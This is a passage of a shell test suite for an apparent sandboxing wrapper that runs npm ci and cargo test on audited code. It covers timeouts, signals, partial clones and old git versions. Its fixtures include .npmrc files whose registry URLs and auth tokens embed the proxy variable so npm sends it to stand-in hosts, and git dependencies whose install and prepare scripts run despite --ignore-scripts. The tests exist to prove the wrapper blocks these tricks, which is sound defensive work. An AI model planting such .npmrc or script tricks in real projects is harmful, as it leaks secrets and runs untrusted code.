  calls_are "npm ci --ignore-scripts --no-audit --no-fund|"
check "... in the copy, with the proxy" sh -c "awk '/^== npm ci/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'cwd: $S/src' '$T/blk' && grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/blk' && grep -qxF 'lock: yes' '$T/blk'"
settings FAKE_NPM_CI_RC=1
run "$TARGET" "$WT" -- npm-ci --run audit_1 --src .
check "npm ci that fails (a lockfile out of step with package.json): exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> npm-ci: npm ci --ignore-scripts failed (exit 1)' '$T/out'"
settings
# npm takes a project's settings from the .npmrc of the package root it finds from its working directory up,
# a workspace's root among them, and expands ${VAR} in them from its environment, the proxy variables
# included. fixtures/target/fake-npm.sh, first on PATH, reports each .npmrc from where it runs up to the top
# of the copy. $T/npmwt is not a repository: a workspace whose top and app/ each hold a package.json, a lock
# and a .npmrc naming ${HTTPS_PROXY}, with app/deep/.npmrc below them, and Cargo.toml and Anchor.toml.
NW=$T/npmwt
mkdir -p "$T/npmfake" "$NW/app/deep"
sed "s#@T@#$T#g" "$FIXT/target/fake-npm.sh" > "$T/npmfake/npm" && chmod 700 "$T/npmfake/npm"
printf '[package]\nname = "npmwt"\nversion = "0.1.0"\n' > "$NW/Cargo.toml"
printf '[provider]\ncluster = "localnet"\n' > "$NW/Anchor.toml"
printf '{\n  "name": "npmwt",\n  "version": "1.0.0",\n  "workspaces": ["app"]\n}\n' > "$NW/package.json"
printf '{\n  "name": "app",\n  "version": "1.0.0"\n}\n' > "$NW/app/package.json"
cp "$WT/package-lock.json" "$NW/package-lock.json"
cp "$WT/package-lock.json" "$NW/app/package-lock.json"
printf 'registry=https://npm.invalid/${HTTPS_PROXY}/\n' > "$NW/.npmrc"
printf '//npm.invalid/:_authToken=${HTTPS_PROXY}\n' > "$NW/app/.npmrc"
printf 'fund=false\n' > "$NW/app/deep/.npmrc"
( cd "$NW" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$NW/audit_1/exec-mode"
NOTE='>> note: npm ci takes no settings from the code under audit: target.sh removed these from the copy, and the registry and other settings they name do not apply:'
run "$TARGET" "$NW" PATH="$T/npmfake:$FPATH" HTTPS_PROXY="$PROXY" -- npm-ci --run audit_1 --src .
check "npm-ci where the copy's top holds a .npmrc naming \${HTTPS_PROXY}: npm ci finds no .npmrc" in_blocks '^== npm ci' '^npmrc: none$'
check "... the run goes on, and a note names the .npmrc removed" sh -c "[ '$RC' = 0 ] && grep -qxF '$NOTE .npmrc' '$T/out'"
check "... and npm's script-shell is false" sh -c "grep -q '^env: npm_config_script_shell=/[^ ]*/false\$' '$T/calls'"
# The module itself, with the real node where it is installed: fixtures/target/fake-npm.sh copied it to
# $T/preload.js. In the npm install npm runs in a git dependency's checkout (pacote marks it with
# _PACOTE_NO_PREPARE_) it ends node at once; elsewhere child_process starts git and node and nothing else.
if PATH=$REAL_PATH command -v node >/dev/null 2>&1; then
  out=$(cd "$T" && env -i PATH="$REAL_PATH" _PACOTE_NO_PREPARE_='git+file:///dep#0' node -r "$T/preload.js" -e 'console.log("ran")' 2>&1 </dev/null; echo "rc=$?")
  check "preload: a node process pacote marks with _PACOTE_NO_PREPARE_ ends at once with exit 0" test "$out" = rc=0
  out=$(cd "$T" && env -i PATH="$REAL_PATH" npm_config_git="$T/sys/git" node -r "$T/preload.js" -e '
const cp = require("child_process")
const one = (what, start) => { try { start(); return what + " starts" } catch (e) { return what + " refused" } }
console.log([one("sh", () => cp.spawn("sh", ["-c", "true"])), one("shell", () => cp.spawn("true", { shell: true })),
  one("exec", () => cp.exec("true")), one("execFile", () => cp.execFile("/bin/echo", ["x"])),
  one("git", () => cp.spawn(process.env.npm_config_git, ["--version"], { stdio: "ignore" })),
  one("node", () => cp.spawn(process.execPath, ["-e", "0"], { stdio: "ignore" }))].join(", "))' 2>&1 </dev/null)
  check "preload: otherwise child_process starts git and node, and refuses sh, a shell command and any other program" \
    test "$out" = "sh refused, shell refused, exec refused, execFile refused, git starts, node starts"
else
  skp "node is not on PATH: the preload's own cases are skipped"
fi
run "$TARGET" "$NW" PATH="$T/npmfake:$FPATH" HTTPS_PROXY="$PROXY" -- npm-ci --run audit_1 --src . --dir app
check "npm-ci --dir app, a workspace of the top: npm ci runs in app and finds no .npmrc up to the top" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'cwd: $S/src/app' '$T/calls' && grep -qxF 'npmrc: none' '$T/calls' && ! grep -q '^npmrc: [^n]' '$T/calls' && grep -qxF '$NOTE .npmrc, app/.npmrc' '$T/out'"
run "$TARGET" "$NW" PATH="$T/npmfake:$FPATH" HTTPS_PROXY="$PROXY" -- anchor-test --run audit_1 --src .
check "anchor-test's npm ci finds no .npmrc of the copy either" \
  sh -c "[ '$RC' = 0 ] && grep -q '^== npm ci ' '$T/calls' && ! grep -q '^npmrc: [^n]' '$T/calls' && grep -qxF '$NOTE .npmrc' '$T/out'"
# Outside strict mode the registry= and @<scope>:registry= lines of a .npmrc whose value is an https URL with no
# space and no $ stay for npm ci, with a note; every other line goes (the token's, one naming ${HOME}, a plain
# http one), and so does a .npmrc with no such line. $T/npmkeep is not a repository: its top and app/ each hold
# a package.json, a lock and a .npmrc.
NK=$T/npmkeep
mkdir -p "$NK/app"
for d in "$NK" "$NK/app"; do printf '{\n  "name": "nk",\n  "version": "1.0.0"\n}\n' > "$d/package.json"; cp "$WT/package-lock.json" "$d/"; done
printf 'registry = https://registry.example.com/npm/\n@acme:registry=https://npm.acme.dev/\n//registry.example.com/:_authToken=canary-npmrc-token\nalways-auth=true\n@x:registry=https://x.invalid/${HOME}/\nregistry=http://plain.invalid/\n' > "$NK/.npmrc"
printf 'fund=false\n' > "$NK/app/.npmrc"
( cd "$NK" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$NK/audit_1/exec-mode"
run "$TARGET" "$NK" PATH="$T/npmfake:$FPATH" -- npm-ci --run audit_1 --src . --dir app
check "npm-ci where .npmrc names https registries: npm ci finds only those lines, as key=value, and app/.npmrc is gone" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'npmrc: .npmrc: registry=https://registry.example.com/npm/|@acme:registry=https://npm.acme.dev/|' '$T/calls' && [ \"\$(grep -c '^npmrc: ' '$T/calls')\" = 1 ] && ! grep -q 'canary-npmrc-token' '$T/calls'"
check "... a note names the lines kept, and today's note the .npmrc removed" \
  sh -c "grep -qxF '>> note: npm ci takes only the https registry lines of .npmrc from the code under audit: target.sh kept registry=https://registry.example.com/npm/, @acme:registry=https://npm.acme.dev/, and removed every other line' '$T/out' && grep -qxF '$NOTE app/.npmrc' '$T/out'"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$NK" PATH="$T/npmfake:$FPATH" AUDITOR_STRICT=1 -- npm-ci --run audit_1 --src . --dir app
  check "... strict mode keeps none of them" sh -c "[ '$RC' = 0 ] && grep -qxF 'npmrc: none' '$T/calls' && grep -qxF '$NOTE .npmrc, app/.npmrc' '$T/out'"
fi
mkdir -p "$T/tmp-q\"uote"
run "$TARGET" "$NW" PATH="$T/npmfake:$FPATH" TMPDIR="$T/tmp-q\"uote" -- npm-ci --run audit_1 --src .
check "a scratch directory whose path holds a double quote, which NODE_OPTIONS cannot quote: exit 3, npm does not run" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: the scratch directory.s path holds a double quote or a backslash' '$T/err' && ! grep -q '^== npm' '$T/calls'"
# The real npm, where it is installed. The copy's .npmrc sets loglevel=info and a log heading made of
# ${https_proxy}: npm run in that tree takes both, so its log lines start with the proxy URL; the npm ci of
# target.sh takes neither, so no info line and no part of the proxy URL reaches its log.
if PATH=$REAL_PATH command -v npm >/dev/null 2>&1 && PATH=$REAL_PATH command -v node >/dev/null 2>&1; then
  NR=$T/npmreal
  mkdir -p "$NR" "$T/npm-own/home"
  : > "$T/npm-own/userconfig"
  : > "$T/npm-own/globalconfig"
  printf '{\n  "name": "npmreal",\n  "version": "1.0.0"\n}\n' > "$NR/package.json"
  printf '{\n  "name": "npmreal",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n    "": {\n      "name": "npmreal",\n      "version": "1.0.0"\n    }\n  }\n}\n' > "$NR/package-lock.json"
  printf 'loglevel=info\nheading=npm-${https_proxy}\n' > "$NR/.npmrc"
  ( cd "$NR" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$NR/audit_1/exec-mode"
  own=$(cd "$NR" && env -i HOME="$T/npm-own/home" PATH="$REAL_PATH" https_proxy="$PROXY" \
    npm_config_userconfig="$T/npm-own/userconfig" npm_config_globalconfig="$T/npm-own/globalconfig" \
    npm_config_cache="$T/npm-own/cache" npm_config_logs_dir="$T/npm-own/logs" npm_config_update_notifier=false \
    npm config get loglevel 2>&1 </dev/null)
  case "$own" in *"npm-$PROXY info "*) took=yes ;; *) took=no ;; esac
  check "real npm, run in a tree whose .npmrc sets loglevel=info and heading=npm-\${https_proxy}, prints the proxy URL" test "$took" = yes
  run "$TARGET" "$NR" PATH="$REAL_PATH" https_proxy="$PROXY" -- npm-ci --run audit_1 --src .
  log=$(sed -n 's/.*; log \(audit_1\/exec\/npm-ci-[0-9]*[.]log\).*/\1/p' "$T/out")
  check "... while target.sh's real npm ci of that tree takes nothing from it: exit 0, no info line, no proxy URL in its log" \
    sh -c "[ '$RC' = 0 ] && [ -n '$log' ] && [ -f '$NR/$log' ] && ! grep -q ' info using ' '$NR/$log' && ! grep -q 'CANARY-proxy' '$NR/$log' '$T/out' '$T/err'"
else
  skp "npm or node is not on PATH: target.sh's real npm ci case is skipped"
fi
# npm prepares a git dependency that has workspaces or an install, build or prepare script with an npm install in
# that dependency's checkout, and that npm takes the checkout's .npmrc. $T/npmgit-<shape>'s lockfile names such a
# dependency by git+file:// (a git host in practice): a repository whose .npmrc names a registry made of
# ${https_proxy}, whose package.json depends on left-pad and has an install script that would leave a mark, or,
# for the shape workspaces, workspaces and no script. npm ci of that tree on its own sends the proxy URL to that
# registry; target.sh's npm ci installs the dependency and takes nothing from it.
if PATH=$REAL_PATH command -v npm >/dev/null 2>&1 && PATH=$REAL_PATH command -v node >/dev/null 2>&1; then
  for shape in install workspaces; do
    GD=$T/gitdep-$shape NG=$T/npmgit-$shape
    rm -rf "$T/npm-own" "$T/install-mark"
    mkdir -p "$GD" "$NG" "$T/npm-own/home"
    : > "$T/npm-own/userconfig"
    : > "$T/npm-own/globalconfig"
    tgit init -q "$GD"
    case "$shape" in
      install) printf '{\n  "name": "dep",\n  "version": "1.0.0",\n  "scripts": {"install": "touch %s/install-mark"},\n  "dependencies": {"left-pad": "1.3.0"}\n}\n' "$T" > "$GD/package.json" ;;
      *) printf '{\n  "name": "dep",\n  "version": "1.0.0",\n  "workspaces": [],\n  "dependencies": {"left-pad": "1.3.0"}\n}\n' > "$GD/package.json" ;;
    esac
    printf 'registry=https://npm.invalid/${https_proxy}/\nfetch-retries=0\n' > "$GD/.npmrc"
    tgit -C "$GD" add -A && tgit -C "$GD" commit -qm dep
    spec=git+file://$GD#$(tgit -C "$GD" rev-parse HEAD)
    printf '{\n  "name": "npmgit",\n  "version": "1.0.0",\n  "dependencies": {"dep": "%s"}\n}\n' "$spec" > "$NG/package.json"
    printf '{\n  "name": "npmgit",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n    "": {"name": "npmgit", "version": "1.0.0", "dependencies": {"dep": "%s"}},\n    "node_modules/dep": {"version": "1.0.0", "resolved": "%s"}\n  }\n}\n' "$spec" "$spec" > "$NG/package-lock.json"
    cp -R "$NG" "$T/npm-own/tree"
    ( cd "$NG" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$NG/audit_1/exec-mode"
    own=$(cd "$T/npm-own/tree" && env -i HOME="$T/npm-own/home" PATH="$REAL_PATH" https_proxy="$PROXY" \
      npm_config_userconfig="$T/npm-own/userconfig" npm_config_globalconfig="$T/npm-own/globalconfig" \
      npm_config_cache="$T/npm-own/cache" npm_config_logs_dir="$T/npm-own/logs" npm_config_update_notifier=false \
      npm_config_ignore_scripts=true npm ci --ignore-scripts --no-audit --no-fund 2>&1 </dev/null)
    case "$own" in *CANARY-proxy*) took=yes ;; *) took=no ;; esac
    check "real npm ci of a tree whose git dependency ($shape) holds a .npmrc naming \${https_proxy}: the npm install in the dependency's checkout sends the proxy URL" test "$took" = yes
    run "$TARGET" "$NG" PATH="$REAL_PATH" https_proxy="$PROXY" -- npm-ci --run audit_1 --src .
    log=$(sed -n 's/.*; log \(audit_1\/exec\/npm-ci-[0-9]*[.]log\).*/\1/p' "$T/out")
    check "... while target.sh's npm ci installs it and takes nothing from it: exit 0, no proxy URL in its log, no script run" \
      sh -c "[ '$RC' = 0 ] && [ -n '$log' ] && [ -f '$NG/$log' ] && grep -q '^added 1 package' '$NG/$log' && ! grep -q 'CANARY-proxy' '$NG/$log' '$T/out' '$T/err' && [ ! -e '$T/install-mark' ]"
  done
else
  skp "npm or node is not on PATH: target.sh's real npm ci cases with a git dependency are skipped"
fi
# npm 10 runs the prepare script of a git dependency, after the npm install in its checkout, and of a package
# the lockfile resolves to a directory, despite --ignore-scripts, with the sh it finds first on a PATH that
# starts with that package's node_modules/.bin. $T/npmprep-git's lockfile names a git+file:// dependency with a
# prepare script that leaves a mark and no dependency; in $T/npmprep-git-sh that dependency also holds
# node_modules/.bin/sh, a link to bash; $T/npmprep-dir asks for loc 1.0.0, and its lockfile resolves that to
# its directory loc/, not as a link, whose prepare script leaves the mark.
if PATH=$REAL_PATH command -v npm >/dev/null 2>&1 && PATH=$REAL_PATH command -v node >/dev/null 2>&1; then
  for shape in git git-sh dir; do
    NP=$T/npmprep-$shape
    rm -rf "$T/npm-own" "$T/prepare-mark"
    mkdir -p "$NP" "$T/npm-own/home"
    : > "$T/npm-own/userconfig"
    : > "$T/npm-own/globalconfig"
    if [ "$shape" != dir ]; then
      GD=$T/gitdep-prepare-$shape
      mkdir -p "$GD"
      tgit init -q "$GD"
      printf '{\n  "name": "dep",\n  "version": "1.0.0",\n  "scripts": {"prepare": "touch %s/prepare-mark"}\n}\n' "$T" > "$GD/package.json"
      [ "$shape" = git ] || { mkdir -p "$GD/node_modules/.bin" && ln -s /bin/bash "$GD/node_modules/.bin/sh"; }
      tgit -C "$GD" add -A -f && tgit -C "$GD" commit -qm dep
      spec=git+file://$GD#$(tgit -C "$GD" rev-parse HEAD)
      printf '{\n  "name": "npmprep",\n  "version": "1.0.0",\n  "dependencies": {"dep": "%s"}\n}\n' "$spec" > "$NP/package.json"
      printf '{\n  "name": "npmprep",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n    "": {"name": "npmprep", "version": "1.0.0", "dependencies": {"dep": "%s"}},\n    "node_modules/dep": {"version": "1.0.0", "resolved": "%s"}\n  }\n}\n' "$spec" "$spec" > "$NP/package-lock.json"
    else
      mkdir -p "$NP/loc"
      printf '{\n  "name": "loc",\n  "version": "1.0.0",\n  "scripts": {"prepare": "touch %s/prepare-mark"}\n}\n' "$T" > "$NP/loc/package.json"
      printf '{\n  "name": "npmprep",\n  "version": "1.0.0",\n  "dependencies": {"loc": "1.0.0"}\n}\n' > "$NP/package.json"
      printf '{\n  "name": "npmprep",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n    "": {"name": "npmprep", "version": "1.0.0", "dependencies": {"loc": "1.0.0"}},\n    "node_modules/loc": {"version": "1.0.0", "resolved": "file:loc"}\n  }\n}\n' > "$NP/package-lock.json"
    fi
    cp -R "$NP" "$T/npm-own/tree"
    ( cd "$NP" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$NP/audit_1/exec-mode"
    (cd "$T/npm-own/tree" && env -i HOME="$T/npm-own/home" PATH="$REAL_PATH" \
      npm_config_userconfig="$T/npm-own/userconfig" npm_config_globalconfig="$T/npm-own/globalconfig" \
      npm_config_cache="$T/npm-own/cache" npm_config_logs_dir="$T/npm-own/logs" npm_config_update_notifier=false \
      npm_config_ignore_scripts=true npm ci --ignore-scripts --no-audit --no-fund) >/dev/null 2>&1 </dev/null
    if [ -e "$T/prepare-mark" ]; then
      ok "real npm ci --ignore-scripts of a tree with a $shape dependency runs that dependency's prepare script"
    else
      skp "this npm runs no prepare script of a $shape dependency under --ignore-scripts"
    fi
    rm -f "$T/prepare-mark"
    run "$TARGET" "$NP" PATH="$REAL_PATH" -- npm-ci --run audit_1 --src .
    check "... while target.sh's npm ci runs none: no mark, and if npm stopped at the script, a note says so" \
      sh -c "[ ! -e '$T/prepare-mark' ] && { [ '$RC' = 0 ] || { [ '$RC' = 1 ] && grep -q '^>> note: npm tried to run a dependency.s script' '$T/out'; }; }"
  done
else
  skp "npm or node is not on PATH: target.sh's real npm ci cases with a prepare script are skipped"
fi

# =================================================================================================
# target.sh: the watchdog, signals and large output.
# =================================================================================================
# gone <pid>: that process is gone within 5 s. A killed process stays in the process table, and kill -0
# still finds it, until it is reaped, which can lag on a loaded machine. No pid (the stand-in never wrote its
# pid file, so it never started the process) means nothing was left behind.
gone() {
  local i=0
  case "$1" in ''|*[!0-9]*) return 0 ;; esac
  while kill -0 "$1" 2>/dev/null; do
    [ "$i" -lt 50 ] || return 1
    sleep 0.1
    i=$((i + 1))
  done
}
# The limit is one deadline for every step of the run, cargo fetch first, so it leaves the stand-ins time to
# reach cargo test, and its background process, on a loaded machine.
settings FAKE_SLEEP=60
rm -f "$T/grandchild.pid"
t0=$(date +%s)
run "$TARGET" "$WT" AUDITOR_RUN_TIMEOUT=15 -- cargo-test --run audit_1 --src .
t1=$(date +%s)
check "AUDITOR_RUN_TIMEOUT: a step past the limit is killed, exit 3 ($((t1 - t0)) s)" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: cargo test: the run passed its 15-second limit (AUDITOR_RUN_TIMEOUT or --timeout) and was killed; log ' '$T/err' && [ $((t1 - t0)) -lt 45 ]"
gc=$(cat "$T/grandchild.pid" 2>/dev/null)
check "... and so is the process the step started in the background" gone "$gc"
check "... and the scratch directory is gone" sh -c "[ '$RC' = 3 ] && [ -z \"\$(ls -A '$NT')\" ]"
# The deadline also covers the clone before the first watched step, so --timeout leaves it room too.
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src . --timeout 12
check "--timeout lowers the limit" sh -c "[ '$RC' = 3 ] && grep -q 'the run passed its 12-second limit' '$T/err'"
check "... and ulimit -t follows it, in each watched step" in_blocks '^== cargo (fetch|test)' '^ulimit: ([1-9]|[1-3][0-9]|4[0-8]) 4194304$'
settings FAKE_LEFTOVER=1
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
lo=$(cat "$T/leftover.pid" 2>/dev/null)
gone "$lo"; lorc=$?
check "a process a step leaves behind is killed when the step ends" sh -c "[ '$RC' = 0 ] && [ '$lorc' = 0 ]"
settings FAKE_SLEEP=60
rm -rf "$NT" "$T/calls" "$T/grandchild.pid"; mkdir -p "$NT"; : > "$T/calls"
( cd "$WT" && exec env -i HOME="$CLEANHOME" PATH="$FPATH" TMPDIR="$NT" "${SHELLS[0]}" "$TARGET" cargo-test --run audit_1 --src . ) \
  >"$T/out" 2>"$T/err" </dev/null &
bg=$!
i=0
while [ ! -s "$T/grandchild.pid" ] && [ "$i" -lt 100 ]; do sleep 0.2; i=$((i + 1)); done
kill -TERM "$bg" 2>/dev/null
t0=$(date +%s)
wait "$bg"
RC=$?
t1=$(date +%s)
gc=$(cat "$T/grandchild.pid" 2>/dev/null)
gone "$gc"; gcrc=$?
check "SIGTERM to target.sh stops the step at once ($((t1 - t0)) s), kills what it started, and removes the scratch directory" \
  sh -c "[ '$RC' = 143 ] && [ $((t1 - t0)) -lt 15 ] && [ '$gcrc' = 0 ] && [ -z \"\$(ls -A '$NT')\" ]"
settings FAKE_BIG=17000000
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
log=$(sed -n 's/.*; log \(audit_1\/exec\/cargo-test-[0-9]*[.]log\).*/\1/p' "$T/out")
size=$(wc -c < "$WT/$log" 2>/dev/null | tr -d ' ')
check "a log over 16 MiB keeps its last 16 MiB, after a line that says so ($size bytes)" \
  sh -c "[ '$RC' = 0 ] && [ '$size' -gt 16777216 ] && [ '$size' -lt 16777400 ] && sed -n 1p '$WT/$log' | grep -q '^>> the log holds [0-9]* bytes; target.sh kept its last 16777216\$'"
settings

# =================================================================================================
# target.sh: a source that is not a repository, submodules, and what must be in place.
# =================================================================================================
# $T/plain is not a repository: a package with target/, sub/TARGET/, node_modules/ and sub/Node_Modules/
# directories, a run directory, two more spelled AUDIT_7 and Incident_9 (a volume that ignores case finds audit_7
# under the name AUDIT_7), the store as .Audit-Memory, a top-level audit_notes.md, a link and a FIFO.
P=$T/plain
mkdir -p "$P/src" "$P/target" "$P/sub/TARGET" "$P/node_modules/x" "$P/sub/Node_Modules" "$P/sub/keep" "$P/.Audit-Memory" \
  "$P/AUDIT_7" "$P/Incident_9"
printf '[package]\nname = "plainpkg"\nversion = "0.1.0"\n' > "$P/Cargo.toml"
printf 'fn p() {}\n' > "$P/src/lib.rs"
printf 'built\n' > "$P/target/out"; printf 'built\n' > "$P/sub/TARGET/out"; printf 'js\n' > "$P/sub/Node_Modules/y"
printf 'kept\n' > "$P/sub/keep/file"; printf 'db\n' > "$P/.Audit-Memory/audit.db"; printf 'notes\n' > "$P/audit_notes.md"
printf 'run\n' > "$P/AUDIT_7/notes.md"; printf 'hunt\n' > "$P/Incident_9/notes.md"
ln -s /etc/hosts "$P/lnk"
mkfifo "$P/pipe" 2>/dev/null || true
( cd "$P" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$P/audit_1/exec-mode"
settings FAKE_LIST=1
run "$TARGET" "$P" -- cargo-test --run audit_1 --src .
check "a source that is not a repository is copied file by file, without run directories, the store, target/ and node_modules/ in any letter case" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'listing: . ./Cargo.toml ./lnk ./src ./src/lib.rs ./sub ./sub/keep ./sub/keep/file ' '$T/calls'"
check "... its links kept as links, never followed" grep -qxF 'link: ./lnk -> /etc/hosts' "$T/calls"
run "$TARGET" "$P" -- cargo-test --run audit_1 --src . --rev HEAD
check "--rev with a source that is not a repository is refused" sh -c "[ '$RC' = 64 ] && grep -qxF 'target: refused: --rev needs a repository --src, and . is not the top level of one' '$T/err'"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src programs
check "a directory inside a repository, not its top, is copied as files" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: no Cargo.toml at the top of the copy' '$T/err'"
settings
# A repository whose commit has a submodule, which target.sh never fetches: strict mode stops there; otherwise
# a note says so, and the build sees the empty directory a checkout leaves.
SM=$T/subwt
tgit init -q "$SM" && tgit -C "$SM" symbolic-ref HEAD refs/heads/main
printf '[package]\nname = "sm"\nversion = "0.1.0"\n' > "$SM/Cargo.toml"
tgit -C "$SM" add Cargo.toml
tgit -C "$SM" update-index --add --cacheinfo "160000,$V1,vendor/sub"
tgit -C "$SM" commit -qm 'with a submodule'
SMSHA=$(tgit -C "$SM" rev-parse HEAD)
( cd "$SM" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$SM/audit_1/exec-mode"
SUBNOTE=">> note: $SMSHA has submodules (vendor/sub), which target.sh never fetches: the build sees them as empty directories; strict mode stops here (Rule 11f)"
settings FAKE_LIST=1
run "$TARGET" "$SM" -- cargo-test --run audit_1 --src .
check "a revision with a submodule: exit 0, a note names it, and the build sees it as an empty directory" \
  sh -c "[ '$RC' = 0 ] && grep -qxF '$SUBNOTE' '$T/out' && grep -q '^listing: .* ./vendor/sub \$' '$T/calls'"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$SM" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "strict mode, the same revision: exit 3, nothing fetched or built" \
    sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: $SMSHA has submodules (vendor/sub), and target.sh never fetches them; log ' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
fi
settings
# A partial clone.
PC=$T/partwt
tgit clone -q --no-local "$WT" "$PC" 2>/dev/null
tgit -C "$PC" config extensions.partialClone origin
( cd "$PC" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$PC/audit_1/exec-mode"
# Outside strict mode, when the revision's tree and every object in it are there (git rev-list --objects
# --missing=print, fetching nothing), the copy comes from git's read-only plumbing, with a note; strict mode
# stops as today.
settings FAKE_SHOW=programs/demo/src/lib.rs
run "$TARGET" "$PC" -- cargo-test --run audit_1 --src .
PCSHA=$(tgit -C "$PC" rev-parse HEAD)
check "a partial clone whose revision has every file: exit 0, the note, and the build sees HEAD (v2)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF \">> note: --src . is a partial clone, and every file of $PCSHA is in it, so target.sh copies the tracked files of the commit with git's read-only plumbing, fetching nothing; strict mode stops here (Rule 11f)\" '$T/out' && grep -qxF 'show: // v2' '$T/calls'"
settings
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$PC" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
  check "... strict mode: exit 3 before anything is copied, as today" sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: . is a partial clone: a copy would lack the objects it never fetched' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
fi
# A blobless clone with nothing checked out lacks the files of its revision: a blocker in both modes.
PB=$T/blobless
tgit clone -q --no-local --bare "$WT" "$T/blobless-src.git" 2>/dev/null && tgit -C "$T/blobless-src.git" config uploadpack.allowFilter true
tgit clone -q --no-checkout --filter=blob:none "file://$T/blobless-src.git" "$PB" 2>/dev/null
( cd "$PB" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$PB/audit_1/exec-mode"
run "$TARGET" "$PB" -- cargo-test --run audit_1 --src .
check "a partial clone that lacks files of its revision: exit 3, nothing fetched or copied" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: . is a partial clone that lacks files of [0-9a-f]* it never fetched, and nothing is fetched (Rule 11c) — nothing was copied or built.\$' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
# git without the May-2024 clone fixes never clones the source: strict mode stops; otherwise target.sh writes the
# tracked files of the commit itself, from git ls-tree and git cat-file --batch, and a note says so. The
# stand-in names its version and logs every git command it runs.
mkdir -p "$T/oldgit"
cat > "$T/oldgit/git" <<SH
#!/bin/sh
printf '%s\n' "\$*" >> "$T/oldgit.log"
[ "\$1" = --version ] && { echo "git version 2.39.3"; exit 0; }
exec $(command -v git) "\$@"
SH
chmod +x "$T/oldgit/git"
OLDGIT=">> note: this git reports 2.39.3, older than 2.39.4, that line's May-2024 fixed release, so target.sh copies the tracked files of the commit with git's read-only plumbing instead of cloning; strict mode stops here (Rule 11f)"
: > "$T/oldgit.log"
settings FAKE_SHOW=programs/demo/src/lib.rs FAKE_LIST=1
run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src .
check "git 2.39.3: exit 0, the note, and the build sees the committed HEAD (v2)" \
  sh -c "[ '$RC' = 0 ] && grep -qxF \"$OLDGIT\" '$T/out' && grep -qxF 'show: // v2' '$T/calls'"
check "... git ran ls-tree and cat-file --batch, and never clone" \
  sh -c "grep -q ' ls-tree -r -z --full-tree ' '$T/oldgit.log' && grep -q ' cat-file --batch\$' '$T/oldgit.log' && ! grep -qw clone '$T/oldgit.log'"
check "... the copy holds the tracked files, no untracked one or run directory, in a repository git init made" \
  sh -c "grep -q '^listing: .* ./Cargo.toml .* ./app/yarn.lock .* ./programs/demo/src/lib.rs ./rust-toolchain.toml ./src ./src/lib.rs \$' '$T/calls' && ! grep -qE '^listing: .* [.]/(audit_1|incident_1|linkdir|Cargo[.]lock|sub|big|[.]npmrc)[ /]' '$T/calls' && grep -q '^listing: .* ./.git/HEAD ' '$T/calls' && ! grep -q '^listing: .* ./.git/hooks' '$T/calls'"
check "... and no program or hook the repository's config names ran" test -z "$(ls -A "$T/marks")"
mkdir -p "$T/oldgit230"
sed 's/git version 2[.]39[.]3/git version 2.30.1/' "$T/oldgit/git" > "$T/oldgit230/git" && chmod +x "$T/oldgit230/git"
run "$TARGET" "$WT" PATH="$T/oldgit230:$FPATH" -- cargo-test --run audit_1 --src .
check "... git 2.30.1, a line before 2.39: the note says older than 2.39.4, the oldest fixed release" \
  sh -c "[ '$RC' = 0 ] && grep -q '^>> note: this git reports 2.30.1, older than 2.39.4, the oldest May-2024 fixed release, so target.sh copies ' '$T/out'"
run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src . --rev "$V1"
check "... --rev checks that commit out" sh -c "[ '$RC' = 0 ] && grep -qxF 'show: // v1' '$T/calls'"
run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src . --patch audit_1/patches/F-1.patch
check "... --patch is applied with git apply" sh -c "[ '$RC' = 0 ] && grep -qxF 'show: // patched' '$T/calls'"
run "$TARGET" "$WT" PATH="$T/oldgit:$FPATH" -- cargo-test --run audit_1 --src . --patch audit_1/patches/F-3.patch
check "... a patch that does not apply: exit 3, nothing built" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: audit_1/patches/F-3.patch does not apply to $V2; log ' '$T/err' && ! grep -q '^== cargo test' '$T/calls'"
